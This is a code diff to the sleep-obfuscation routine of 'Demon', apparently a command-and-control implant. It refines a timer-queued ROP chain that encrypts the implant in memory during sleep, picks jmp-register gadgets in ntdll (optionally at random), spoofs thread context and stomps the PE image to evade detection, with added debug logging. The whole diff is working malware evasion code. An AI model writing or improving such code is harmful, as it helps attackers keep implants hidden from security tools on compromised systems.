@@ -3,7 +3,9 @@
 #include <Demon.h>
 
 #include <common/Macros.h>
+#include <core/Memory.h>
 #include <core/SleepObf.h>
+#include <core/PeProtect.h>
 #include <core/Win32.h>
 #include <core/MiniStd.h>
 #include <core/Thread.h>
@@ -47,6 +49,8 @@ BOOL TimerObf(
     BYTE     JmpBypass = { 0 };
     PVOID    JmpGadget = { 0 };
     BYTE     JmpPad[]  = { 0xFF, 0xE0 };
+    SIZE_T   ScanLen   = { 0 };
+    PVOID    ScanBase  = { 0 };
 
     ImageBase = TxtBase = Instance->Session.ModuleBase;
     ImageSize = TxtSize = Instance->Session.ModuleSize;
@@ -143,27 +147,74 @@ BOOL TimerObf(
                         MemCopy( &BkpTib, &Instance->Teb->NtTib, sizeof( NT_TIB ) );
                     }
 
+                    /* restrict gadget scan to ntdll .text (executable) section only — FF E0 bytes
+                     * also appear in non-exec sections (.rdata, .pdata, .reloc); a randomly
+                     * selected non-exec address causes an NX fault in the timer pool thread */
+                    {
+                        PIMAGE_DOS_HEADER     Dos = ( PIMAGE_DOS_HEADER ) Instance->Modules.Ntdll;
+                        PIMAGE_NT_HEADERS     Nts = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
+                        PIMAGE_SECTION_HEADER Sec = RVA( PIMAGE_SECTION_HEADER, &Nts->OptionalHeader, Nts->FileHeader.SizeOfOptionalHeader );
+
+                        /* default fallback: scan past the PE header across the full image */
+                        ScanBase = C_PTR( U_PTR( Dos ) + LDR_GADGET_HEADER_SIZE );
+                        ScanLen  = Nts->OptionalHeader.SizeOfImage;
+                        ScanLen  = ( ScanLen > LDR_GADGET_HEADER_SIZE ) ? ( ScanLen - LDR_GADGET_HEADER_SIZE ) : LDR_GADGET_MODULE_SIZE;
+
+                        /* prefer the first executable section (.text) — guaranteed to be executable */
+                        for ( USHORT i = 0; i < Nts->FileHeader.NumberOfSections; i++, Sec++ ) {
+                            if ( Sec->Characteristics & 0x20000000 ) { /* IMAGE_SCN_MEM_EXECUTE */
+                                ScanBase = C_PTR( U_PTR( Dos ) + Sec->VirtualAddress );
+                                ScanLen  = Sec->Misc.VirtualSize ? Sec->Misc.VirtualSize : Sec->SizeOfRawData;
+                                break;
+                            }
+                        }
+                        PRINTF( "TimerObf: ntdll gadget scan base=%p len=%llu\n", ScanBase, (unsigned long long) ScanLen )
+                    }
+
                     /* search for jmp instruction */
                     if ( JmpBypass )
                     {
-                        PRINTF( "TimerObf: searching gadget JmpBypass=%d\n", JmpBypass )
                         /* change padding to "jmp rbx" */
                         if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) {
                             JmpPad[ 1 ] = 0x23;
                         }
 
-                        /* scan memory for gadget */
-                        if ( ! ( JmpGadget = MmGadgetFind(
-                            C_PTR( U_PTR( Instance->Modules.Ntdll ) + LDR_GADGET_HEADER_SIZE ),
-                            LDR_GADGET_MODULE_SIZE,
-                            JmpPad,
-                            sizeof( JmpPad )
-                        ) ) ) {
+                        /* use random gadget selection when RandGadget is enabled, first-match otherwise */
+                        if ( Instance->Config.Implant.RandGadget ) {
+                            PRINTF( "TimerObf: RandGadget=ON searching gadget JmpBypass=%d\n", JmpBypass )
+                            JmpGadget = MmGadgetFindRandom(
+                                ScanBase,
+                                ScanLen,
+                                JmpPad,
+                                sizeof( JmpPad )
+                            );
+                        } else {
+                            PRINTF( "TimerObf: RandGadget=OFF searching gadget JmpBypass=%d\n", JmpBypass )
+                            JmpGadget = MmGadgetFind(
+                                ScanBase,
+                                ScanLen,
+                                JmpPad,
+                                sizeof( JmpPad )
+                            );
+                        }
+
+                        if ( ! JmpGadget ) {
                             PUTS( "TimerObf: gadget NOT FOUND, downgrading to JMPRAX_NONE" )
                             JmpBypass = SLEEPOBF_BYPASS_NONE;
                         } else {
                             PRINTF( "TimerObf: gadget found at %p\n", JmpGadget )
                         }
+                    }
+
+                    /* pre-flight: print all Win32 pointers used in the ROP chain so NULL is obvious */
+                    PRINTF( "TimerObf: fn-ptr WaitForSingleObjectEx=%p VirtualProtect=%p SystemFunction032=%p NtSetEvent=%p NtContinue=%p\n",
+                            Instance->Win32.WaitForSingleObjectEx, Instance->Win32.VirtualProtect,
+                            Instance->Win32.SystemFunction032, Instance->Win32.NtSetEvent,
+                            Instance->Win32.NtContinue )
+                    if ( Instance->Config.Implant.StackSpoof ) {
+                        PRINTF( "TimerObf: fn-ptr NtGetContextThread=%p RtlCopyMappedMemory=%p NtSetContextThread=%p ThdSrc=%p\n",
+                                Instance->Win32.NtGetContextThread, Instance->Win32.RtlCopyMappedMemory,
+                                Instance->Win32.NtSetContextThread, ThdSrc )
                     }
 
                     /* at this point we can start preparing the ROPs and execute the timers */
@@ -204,7 +255,7 @@ BOOL TimerObf(
                         OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
                         Rop[ Inc ].Rcx = U_PTR( &TimerCtx.Rip );
                         Rop[ Inc ].Rdx = U_PTR( &ThdCtx.Rip );
-                        Rop[ Inc ].R8  = U_PTR( sizeof( VOID ) );
+                        Rop[ Inc ].R8  = U_PTR( sizeof( PVOID ) ); /* copy full 8-byte RIP, not 1 byte (sizeof(VOID)=1 in GCC) */
                         Inc++;
 
                         OBF_JMP( Inc, Instance->Win32.RtlCopyMappedMemory )
@@ -255,13 +306,25 @@ BOOL TimerObf(
                     Inc++;
 
                     /* End of Ropchain */
-                    Rop[ Inc ].Rip = U_PTR( Instance->Win32.NtSetEvent );
                     OBF_JMP( Inc, Instance->Win32.NtSetEvent )
                     Rop[ Inc ].Rcx = U_PTR( EvntDelay );
                     Rop[ Inc ].Rdx = U_PTR( NULL );
                     Inc++;
 
                     PRINTF( "TimerObf: Rops to be executed: %d (TimeOut=%lu Delay base=%lu)\n", Inc, TimeOut, Delay )
+
+                    /* dump each ROP entry so NULL function pointers and wrong args are visible */
+                    for ( int i = 0; i < Inc; i++ ) {
+                        PRINTF( "TimerObf: Rop[%02d] Rip=%p Rax=%p Rcx=%p Rdx=%p R8=%p R9=%p Rsp=%p\n",
+                                i,
+                                C_PTR( Rop[ i ].Rip ),
+                                C_PTR( Rop[ i ].Rax ),
+                                C_PTR( Rop[ i ].Rcx ),
+                                C_PTR( Rop[ i ].Rdx ),
+                                C_PTR( Rop[ i ].R8  ),
+                                C_PTR( Rop[ i ].R9  ),
+                                C_PTR( Rop[ i ].Rsp ) )
+                    }
 
                     /* execute/queue the timers */
                     for ( int i = 0; i < Inc; i++ ) {
@@ -279,12 +342,17 @@ BOOL TimerObf(
                     }
                     PUTS( "TimerObf: all ROPs queued, signaling EvntStart and waiting for EvntDelay" )
 
+                    PUTS( "TimerObf: calling PeProtect_Stomp" )
+                    PeProtect_Stomp();
+                    PUTS( "TimerObf: PeProtect_Stomp done, entering SysNtSignalAndWaitForSingleObject" )
+
                     /* just wait for the sleep to end */
                     if ( ! ( Success = NT_SUCCESS( NtStatus = SysNtSignalAndWaitForSingleObject( EvntStart, EvntDelay, FALSE, NULL ) ) ) ) {
                         PRINTF( "TimerObf: NtSignalAndWaitForSingleObject Failed: %lx\n", NtStatus );
                     } else {
                         PUTS( "TimerObf: sleep cycle completed, EvntDelay signaled" )
                     }
+                    PeProtect_Restore();
                 } else {
                     PRINTF( "RtlCreateTimer/RtlRegisterWait Failed: %lx\n", NtStatus )
                 }
